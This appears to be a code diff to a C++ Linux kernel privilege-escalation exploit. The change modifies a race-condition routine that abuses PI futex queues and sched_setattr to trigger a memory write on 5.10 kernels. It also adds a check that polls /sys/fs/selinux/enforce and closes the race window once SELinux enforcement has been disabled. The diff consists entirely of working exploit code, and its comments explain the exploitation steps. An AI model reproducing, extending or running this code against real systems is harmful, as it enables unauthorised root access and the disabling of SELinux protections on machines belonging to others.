@@ -6,10 +6,15 @@
 
 #include "race/threads.hpp"
 
+#include <fcntl.h>
+#include <unistd.h>
+
 #include "attack/ops.hpp"
+#include "kernel/runtime_struct_offsets.h"
 #include "profile/model.h"
 #include "route/route_controller.h"
 #include "route/route_policy.hpp"
+#include "route/sigreturn_stamp.h"
 #include "session/exploit_session.hpp"
 
 using namespace lsprivilege;
@@ -132,7 +137,13 @@ namespace lsprivilege::race {
                                             ? (calls_this_seq % 19) + 1
                                             : kernel::PSELECT_CONSUMER_NICE;
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
-                    if (sched_ret != 0) {
+                    /* Walk the PI futex queues on every call, not only when
+                     * sched_setattr fails: the walk repositions the stale
+                     * waiter, and that repositioning is what executes its
+                     * stamped write encoding. Kernels where sched_setattr
+                     * fails already reach this path; shallow 5.10 never fails
+                     * there, so a failure-only walk never fires the trigger. */
+                    {
                         struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                         long fret = support::futex_op(
                             &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
@@ -145,6 +156,33 @@ namespace lsprivilege::race {
                     if (sched_ret == 0) race->consumer_success.fetch_add(1);
                     race->consumer_inflight.store(0);
                     calls_this_seq++;
+                    /* With sigreturn stamp delivery the erase lands
+                     * asynchronously inside this walk. Poll the enforce flag
+                     * and close the window the moment it flips — a further
+                     * consume would walk the chain again and re-erase the
+                     * already dequeued node. */
+                    if (race->request &&
+                        session::g_exploit_session.profile.multicast_layout()
+                                    .stamp_delivery.value_or(0) ==
+                                route::kStampDeliverySigreturn &&
+                        race->request->target ==
+                                session::g_exploit_session.addresses.data_alias(
+                                        lsprivilege::profile::selinux_enforcing())) {
+                        char enforce_state = '1';
+                        int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+                        if (enforce_fd >= 0) {
+                            char buf[2] = {0, 0};
+                            ssize_t got = read(enforce_fd, buf, 1);
+                            close(enforce_fd);
+                            if (got == 1) enforce_state = buf[0];
+                        }
+                        if (enforce_state == '0') {
+                            pr_info("consumer: enforce flipped to 0 after %d calls; "
+                                    "closing window\n", calls_this_seq);
+                            race->consumer_go.store(0);
+                            break;
+                        }
+                    }
                     if (static_cast<uint32_t>(calls_this_seq) >=
                         session::g_exploit_session.profile.select_consumer_max_calls()) {
                         race->consumer_go.store(0);
